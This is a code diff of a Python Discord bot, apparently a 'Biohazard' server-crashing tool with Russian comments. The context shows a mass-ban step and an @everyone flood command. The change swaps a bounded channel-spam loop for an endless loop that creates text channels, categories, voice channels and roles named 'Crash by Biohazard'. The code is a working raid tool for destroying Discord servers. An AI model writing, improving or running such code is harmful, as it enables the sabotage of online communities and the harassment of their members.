@@ -68,18 +68,15 @@ class MyClient(discord.Client):
 						pass
 				await message.author.send('**:hammer: Участников забанено: **' + str(m))
 				
-				while s <= 500: #бесконечный цикл
-					for i in message.guild.text_channels:
-						await asyncio.sleep(0.1)
-						try:
-							await i.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC')
-							await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
-							await message.guild.create_category('Crash by Biohazard') #создание категории
-							await message.guild.create_voice_channel(name='Crash by Biohazard') #создание голосового канала
-							await message.guild.create_role(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #создание роли
-							s = s + 1
-						except:
-							pass
+				await asyncio.sleep(0.1)
+				try:
+					while True:
+						await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
+						await message.guild.create_category('Crash by Biohazard') #создание категории
+						await message.guild.create_voice_channel(name='Crash by Biohazard') #создание голосового канала
+						await message.guild.create_role(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #создание роли
+				except:
+					pass
 				
 			if message.content == '*флуд': #флуд
 				spam = '@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC'
